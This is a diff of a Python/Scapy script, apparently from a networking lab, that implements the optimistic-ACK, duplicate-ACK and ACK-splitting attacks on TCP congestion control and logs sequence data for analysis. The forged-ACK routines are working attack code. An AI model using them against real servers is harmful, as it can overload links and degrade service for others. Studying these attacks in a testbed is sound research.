@@ -18,12 +18,13 @@ FileName = "npy/%s.npy" % sys.argv[1]
 ## For Opt attack specifically.
 MTU = 1472 # Default for TCP
 WAIT_TIME = 0.05
-currACKNo = 0
+curr_ACK = 0  # For OPT
+curr_SEQ = 0  # For OPT
+count_SEQ = 0 # For DUP
 MAX_SIZE = 200000
 
 ## Defined across all tranmission types.
 socket = conf.L2socket(iface="client-eth0")
-socket2 = conf.L2socket(iface="client-eth0")
 
 syn = IP(dst=IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=DST_PORT, flags='S')
 IP_SRC = syn[IP].src
@@ -33,6 +34,7 @@ SRC_PORT = syn[TCP].sport
 syn_ack = sr1(syn)
 initialTs = syn_ack.time
 initialSeq = syn_ack[TCP].seq
+count_SEQ = initialSeq
 
 ### Sending response after SYN_ACK
 getStr = 'GET / HTTP/1.1\r\n\r\n'
@@ -41,61 +43,28 @@ request = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
 socket.send(Ether() / request)
 
 
+
+
 ### Global method definitions.
 ##########################################
-### Function to send ACK used in opt.
-def send_ACK():
-  global currACKNo, socket2
-  while (currACKNo - initialSeq) < MAX_SIZE:
-    currACKNo += MTU
-    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-               seq=our_seq_no, ack=currACKNo, flags='A')
-    socket2.send(Ether() / ack_pkt)
-
-
-### Function to check the formatting of packet.
-def check_pkt(pkt):
-  global DST_PORT, IP_DST
-  return (IP not in pkt) or (TCP not in pkt) or (pkt[IP].src != IP_DST) or (pkt[TCP].sport != DST_PORT)
-
-### Calculate length of TCP data segment.
-def data_len(pkt):
-  ip_total_len = pkt.getlayer(IP).len
-  ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
-  tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
-  return ip_total_len - ip_header_len - tcp_header_len
-
-
-### Proper handling for packet with normal transmission.
-#########################################################
-def normal(pkt):
-  global DST_PORT, IP_DST, data, socket
-  if (check_pkt(pkt)):
-    return
-  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+### Send ACK with sequence no seq and ack num ack.
+def send_ACK(seq, ack):
   ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-             seq=(pkt[TCP].ack), ack=(pkt[TCP].seq + data_len(pkt)), flags='A')
+             seq=seq, ack=ack, flags='A')
   socket.send(Ether() / ack_pkt)
 
+### Send ACK with normal sequence progression.
+def send_ACK_in_seq(pkt):
+  send_ACK(pkt[TCP].ack, pkt[TCP].seq + data_len(pkt))
 
 
-### Proper handling for packet with DUP attack.
-#########################################################
-def dup(pkt):
-  global DST_PORT, IP_DST, data, socket
-  if (check_pkt(pkt)):
-    return
-  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+### Function to send ACK used in opt.
+def send_ACK_opt():
+  global curr_ACK
+  while (curr_ACK - initialSeq) < MAX_SIZE:
+    curr_ACK += MTU
+    send_ACK(curr_SEQ, curr_ACK)
 
-  ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-             seq=(pkt[TCP].ack), ack=(pkt[TCP].seq + data_len(pkt)), flags='A')
-  for i in xrange(20):
-    socket.send(Ether() / ack_pkt)
-
-
-
-### Proper handling for packet with SPLIT attack.
-#########################################################
 ## Split ACK across several packets
 def get_split_acks(pkt):
   tcp_seg_len = data_len(pkt)
@@ -108,36 +77,74 @@ def get_split_acks(pkt):
     ACK_nums.append(nextACK_num);
   return ACK_nums
 
-def split(pkt) :
-  global DST_PORT, IP_DST, data, socket
+### Append new data point.
+def append(pkt):
+  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+
+### Function to check the formatting of packet.
+def check_pkt(pkt):
+  return (IP not in pkt) or (TCP not in pkt) or (pkt[IP].src != IP_DST) or (pkt[TCP].sport != DST_PORT)
+
+### Calculate length of TCP data segment.
+def data_len(pkt):
+  ip_len = pkt.getlayer(IP).len
+  ip_head_len = pkt.getlayer(IP).ihl * 32 / 8
+  tcp_head_len = pkt.getlayer(TCP).dataofs * 32 / 8
+  return ip_len - ip_head_len - tcp_head_len
+
+
+
+
+### Proper handling for packet with normal transmission.
+#########################################################
+def normal(pkt):
   if (check_pkt(pkt)):
     return
-  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+  append(pkt)
+  send_ACK_in_seq(pkt)
+  
+
+
+
+### Proper handling for packet with DUP attack.
+#########################################################
+def dup(pkt):
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
+
+  for i in xrange(10):
+    send_ACK_in_seq(pkt)
+
+
+### Proper handling for packet with SPLIT attack.
+#########################################################
+def split(pkt) :
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
   
   for ACK_num in get_split_acks(pkt):
-    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-             seq=pkt[TCP].ack, ack=ACK_num, flags='A')
-    socket.send(Ether() / ack_pkt)
+    send_ACK(pkt[TCP].ack, ACK_num)
 
 
 ### Proper handling for OP attacks.
 #########################################################
 def op(pkt):
-  global DST_PORT, IP_DST, data, socket
   if (check_pkt(pkt)):
     return
-  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+  append(pkt)
+  # ACKs being send optimistically, not in response.
 
-
-
-### Beginning of actual script.
-#################################################
 ## Special timing stuff for op attack.
 if sys.argv[1] == 'op':
-  currACKNo = syn_ack[TCP].seq + 1
-  our_seq_no = syn_ack[TCP].ack + len(getStr) + 1
-  t = threading.Timer(WAIT_TIME, send_ACK)
+  curr_ACK = syn_ack[TCP].seq + 1
+  curr_SEQ = syn_ack[TCP].ack + len(getStr) + 1
+  t = threading.Timer(WAIT_TIME, send_ACK_opt)
   t.start()
+
+
+
 
 ### Choose proper ACK handling given attack type.
 #########################################################
